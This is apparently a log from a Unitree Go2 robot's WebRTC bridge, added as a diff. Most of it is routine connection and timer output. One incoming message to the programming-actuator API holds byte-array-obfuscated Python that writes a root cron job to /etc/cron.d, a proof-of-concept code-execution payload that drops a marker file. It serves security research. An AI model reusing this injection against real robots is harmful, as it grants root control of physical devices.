+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1746]: getOfferToken() before cJSON_GetObjectItem token
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1752]: getOfferToken() after cJSON_GetObjectItem token
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1867]: offerReceived() after parse offer token
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1911]: offerReceived() exit
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:63]: connection state change to [RTC_PEER_CONNECTION_STATE_CONNECTING]
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:98]: [ICE] ICE checking (连通性检查)中, peer: client1715918608
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:446]: [ICE] Gathering candidate: {"candidate":"candidate:1 1 udp 2130706431 169.254.107.33 33044 typ host raddr 0.0.0.0 rport 0 generation 0 network-cost 999","sdpMid":"0","sdpMLineIndex":0}
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:446]: [ICE] Gathering candidate: {"candidate":"candidate:0 1 udp 2130706431 192.168.123.161 59764 typ host raddr 0.0.0.0 rport 0 generation 0 network-cost 999","sdpMid":"0","sdpMLineIndex":0}
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:458]: [ICE] Candidate gathering finished for peer: client1715918608
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:211]: webrtcConnectionAnswer() trigger
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:234]: webrtcConnectionAnswer() coming_topic = rt/webrtcreq, use webrtc_res_writer
+L.dir_path=/unitree/var/log/webrtc_bridge 
+L.module_name=webrtc_bridge 
+dir exist!
+log_init() L.log_files_current_num=1 
+log_delete_previous_version_log_files() enter 
+log_delete_previous_version_log_files() exit 
+log_init() L.log_files_current_num=1 
+log_init_count_log_file_rows_number() trigger 
+log_init_attach_fp() trigger 
+log_init() L.log_files_current_num=1 
+log_init() L.log_file_current_num_of_rows=2180 
+**** createConfiguration
+timerQueueAddTimer() currentTime=1715916925
+[KVS Master] Finished setting audio and video handlers
+[KVS Master] KVS WebRTC initialization completed successfully
+**** sessionCleanupWait()
+     createStreamingSession()
+     initializePeerConnection()
+destIpList[ipCount].address=192 168 123 161 
+ipCount=1
+destIpList[ipCount].address=169 254 107 33 
+ipCount=2
+[KVS Inspect] iceAgentConnectedStateSetup() pDataSendingIceCandidatePair reset
+[KVS Inspect] iceAgentConnectedStateSetup() pIceAgent->pDataSendingIceCandidatePair->local->iceCandidateType=0
+[KVS Inspect] iceAgentReadyStateSetup() pDataSendingIceCandidatePair reset
+[KVS Inspect] iceAgentReadyStateSetup() pIceAgent->pDataSendingIceCandidatePair->local->iceCandidateType=0
+dataChannelOnMessageCallback() pErrorTable count=0 
+unitree_api::msg::dds_::Request_ id=72129369
+write_request() topicName = rt/api/programming_actuator/request
+write_request() current_timeframe = 1715917190
+write_request() do dds_write! 
+     createStreamingSession()
+     initializePeerConnection()
+destIpList[ipCount].address=192 168 123 161 
+ipCount=1
+destIpList[ipCount].address=169 254 107 33 
+ipCount=2
+[KVS Inspect] iceAgentConnectedStateSetup() pDataSendingIceCandidatePair reset
+[KVS Inspect] iceAgentConnectedStateSetup() pIceAgent->pDataSendingIceCandidatePair->local->iceCandidateType=0
+[KVS Inspect] iceAgentReadyStateSetup() pDataSendingIceCandidatePair reset
+[KVS Inspect] iceAgentReadyStateSetup() pIceAgent->pDataSendingIceCandidatePair->local->iceCandidateType=0
+dataChannelOnMessageCallback() pErrorTable count=0 
+unitree_api::msg::dds_::Request_ id=72346630
+write_request() topicName = rt/api/programming_actuator/request
+write_request() current_timeframe = 1715917407
+write_request() do dds_write! 
+     createStreamingSession()
+     initializePeerConnection()
+destIpList[ipCount].address=192 168 123 161 
+ipCount=1
+destIpList[ipCount].address=169 254 107 33 
+ipCount=2
+[KVS Inspect] iceAgentConnectedStateSetup() pDataSendingIceCandidatePair reset
+[KVS Inspect] iceAgentConnectedStateSetup() pIceAgent->pDataSendingIceCandidatePair->local->iceCandidateType=0
+[KVS Inspect] iceAgentReadyStateSetup() pDataSendingIceCandidatePair reset
+[KVS Inspect] iceAgentReadyStateSetup() pIceAgent->pDataSendingIceCandidatePair->local->iceCandidateType=0
+dataChannelOnMessageCallback() pErrorTable count=0 
+unitree_api::msg::dds_::Request_ id=73317452
+write_request() topicName = rt/api/programming_actuator/request
+write_request() current_timeframe = 1715918378
+write_request() do dds_write! 
+     createStreamingSession()
+     initializePeerConnection()
+destIpList[ipCount].address=192 168 123 161 
+ipCount=1
+destIpList[ipCount].address=169 254 107 33 
+ipCount=2
+[KVS Inspect] iceAgentConnectedStateSetup() pDataSendingIceCandidatePair reset
+[KVS Inspect] iceAgentConnectedStateSetup() pIceAgent->pDataSendingIceCandidatePair->local->iceCandidateType=0
+[KVS Inspect] iceAgentReadyStateSetup() pDataSendingIceCandidatePair reset
+[KVS Inspect] iceAgentReadyStateSetup() pIceAgent->pDataSendingIceCandidatePair->local->iceCandidateType=0
+dataChannelOnMessageCallback() pErrorTable count=0 
+unitree_api::msg::dds_::Request_ id=73458505
+write_request() topicName = rt/api/programming_actuator/request
+write_request() current_timeframe = 1715918519
+write_request() do dds_write! 
+     createStreamingSession()
+     initializePeerConnection()
+destIpList[ipCount].address=192 168 123 161 
+ipCount=1
+destIpList[ipCount].address=169 254 107 33 
+ipCount=2
+[KVS Inspect] iceAgentConnectedStateSetup() pDataSendingIceCandidatePair reset
+[KVS Inspect] iceAgentConnectedStateSetup() pIceAgent->pDataSendingIceCandidatePair->local-[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:15]: do_webrtc_req_take() trigger
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:66]: connection state change to [RTC_PEER_CONNECTION_STATE_CONNECTED]
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:249]: logSelectedIceCandidatesInformation() sessionOnTurnServer set to 0
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:535]: onSctpSessionDataChannelOpen() enter
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1475]: tryToIdentifyInterface() enter
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1490]: tryToIdentifyInterface() addr=560725673
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1491]: tryToIdentifyInterface() port=5249
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1508]: tryToIdentifyInterface() found target interface, interface_NAME=eth0
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2261]: [PUBNET] dataChannelOnOpenCallback() rtc_peer_conn->interface_NAME=eth0 
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2271]: [PUBNET] dataChannelOnOpenCallback() pConfiguration->publicNetworkStatus set to Undefined
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2194]: [PUBNET] doInterfacePacketStatisticsThreadFunction enter
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2194]: [PUBNET] doInterfacePacketStatisticsThreadFunction enter
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:140]: dataChannelOnMessageCallback() incoming message = {"type":"req","topic":"rt/api/programming_actuator/request","data":{"header":{"identity":{"id":73547892,"api_id":1002}},"parameter":"{\"program_content\": {\"chunk_index\": 1, \"total_chunk_num\": 1, \"chunk_content\": \"_p = str(bytes([47, 101, 116, 99, 47, 99, 114, 111, 110, 46, 100, 47, 117]), 'utf-8')\\n_e = str(bytes([42, 32, 42, 32, 42, 32, 42, 32, 42, 32, 114, 111, 111, 116, 32, 101, 99, 104, 111, 32, 115, 100, 112, 95, 111, 118, 101, 114, 102, 108, 111, 119, 95, 112, 114, 111, 111, 102, 95, 49, 55, 56, 48, 51, 51, 55, 52, 56, 55, 32, 62, 32, 47, 116, 109, 112, 47, 117, 110, 108, 101, 97, 115, 104, 95, 112, 114, 111, 111, 102, 46, 116, 120, 116, 32, 38, 38, 32, 114, 109, 32, 45, 102, 32, 47, 101, 116, 99, 47, 99, 114, 111, 110, 46, 100, 47, 117]), 'utf-8')\\n_d = np.array([_e])\\nnp.savetxt(_p, _d, fmt='%s')\"}, \"program_uuid\": \"1780337487\", \"bind_hotkey\": \"L1+Y\"}"}}
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:148]: dataChannelOnMessageCallback() incoming topic = rt/api/programming_actuator/request
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:185]: dataChannelOnMessageCallback() request ident id=73547892
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher/request.h:46]: write_request() req.header.policy.priority=0, req.header.policy.noreply=0 
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber/response.h:78]: do_response_data_take() topic=rt/api/programming_actuator/response, sendOnDataChannel msg_len=152
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:75]: connection state change to [RTC_PEER_CONNECTION_STATE_CLOSED]
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:195]: !!! OnSessionClosed() pConfiguration->streamingSessionCount=1
+tcpdump: listening on wlan0, link-type EN10MB (Ethernet), capture size 262144 bytes
+tcpdump: wwan0: No such device exists
+(SIOCGIFHWADDR: No such device)
+tcpdump: /tmp/wwan0_1715918608_captrue.pcap: No such file or directory
+[2024-05-17 12:03:28 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2241]: [PUBNET] Interface:wwan0, Number of lines: 0
+0 packets captured
+0 packets received by filter
+0 packets dropped by kernel
+reading from file /tmp/wlan0_1715918608_captrue.pcap, link-type EN10MB (Ethernet)
+[2024-05-17 12:03:31 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2241]: [PUBNET] Interface:wlan0, Number of lines: 0
+[2024-05-17 12:03:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:04:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:04:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:04:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:05:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:05:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:05:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:06:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:06:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:06:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:07:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:07:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:07:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:08:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:08:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:08:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:09:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:09:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:09:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:10:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:10:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:10:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:11:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:11:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:11:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:12:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:12:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:12:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:13:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:13:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:13:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:14:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:14:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:14:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:15:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:15:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:15:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:16:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:16:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:16:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:17:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:17:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:17:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:18:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:18:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:18:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:19:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:19:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:19:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:20:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:20:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:20:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:21:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:21:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:21:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:22:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:22:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:22:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:23:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:23:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:23:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:24:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:24:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:24:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:25:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:25:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:25:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:26:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:26:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:26:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:27:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:27:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:27:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:28:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:28:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:28:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:29:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:29:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:29:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:30:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:30:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:30:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:31:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:31:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:31:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:32:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:32:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:32:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:33:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:33:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:33:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:34:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:34:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:34:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:35:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:35:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:35:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:36:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:36:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:36:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:37:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:37:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:37:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:38:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:38:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:38:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:39:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:39:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:39:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:40:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:40:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:40:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:41:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:41:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:41:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:42:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
